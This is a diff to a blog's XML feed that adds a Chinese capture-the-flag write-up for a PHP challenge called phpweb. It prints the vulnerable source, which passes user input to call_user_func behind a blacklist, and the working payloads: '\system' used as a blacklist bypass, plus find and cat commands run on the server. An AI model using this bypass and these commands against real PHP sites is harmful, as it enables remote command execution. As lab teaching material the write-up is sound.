@@ -4,6 +4,29 @@
   
   
   <entry>
+    <title>朱雀组]phpweb1</title>
+    <link href="/2025/01/19/%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb1/"/>
+    <url>/2025/01/19/%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb1/</url>
+    
+    <content type="html"><![CDATA[<p> 根据形式，猜测func是命令，p是参数，尝试修改func为phpinfo，发现被过滤了<br> <br> 尝试绕过过滤，php中，\被认定为特殊字符，所以\phpinfo就会绕过过滤，发现index.php文件<br> <br> 采用highlight_file显示当前页面源代码，由于页面刷新速度较快，这里建议用bp抓包或者快速复制下来（我是复制的）<br>  func&#x3D;highlight_file&amp;p&#x3D;index.php<br><!DOCTYPE html></p><html><head>    <title>phpweb</title>    <style type="text/css">        body {            background: url("bg.jpg") no-repeat;            background-size: 100%;        }        p {            color: white;        }    </style></head><body><script language=javascript>    setTimeout("document.form1.submit()",5000)</script><p>    <?php    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");    function gettime($func, $p) {        $result = call_user_func($func, $p);        $a= gettype($result);        if ($a == "string") {            return $result;        } else {return "";}    }    class Test {        var $p = "Y-m-d h:i:s a";        var $func = "date";        function __destruct() {            if ($this->func != "") {                echo gettime($this->func, $this->p);            }        }    }    $func = $_REQUEST["func"];    $p = $_REQUEST["p"];<pre><code class="hljs">if ($func != null) &#123;    $func = strtolower($func);    if (!in_array($func,$disable_fun)) &#123;        echo gettime($func, $p);    &#125;else &#123;        die(&quot;Hacker...&quot;);    &#125;&#125;?&gt;</code></pre></p><form  id=form1 name=form1 action="index.php" method=post>    <input type=hidden id=func name=func value='date'>    <input type=hidden id=p name=p value='Y-m-d h:i:s a'></body></html> 可以发现大量php函数被禁用，而反序列化函数没有被禁用，所以我们这里采用system执行命令。  查找flag：func=\system&p=find / -name 'flag*'  我们猜测flag在flagoefiu4r93目录文件中:  func=\system&p=cat /tmp/flagoefiu4r93  这样就找出了flag (当然也可以一开始就先尝试system命令，会节省不少时间)]]></content>
+    
+    
+    
+    <tags>
+      
+      <tag>原创</tag>
+      
+      <tag>web</tag>
+      
+      <tag>php</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>web代码审计</title>
     <link href="/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     <url>/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
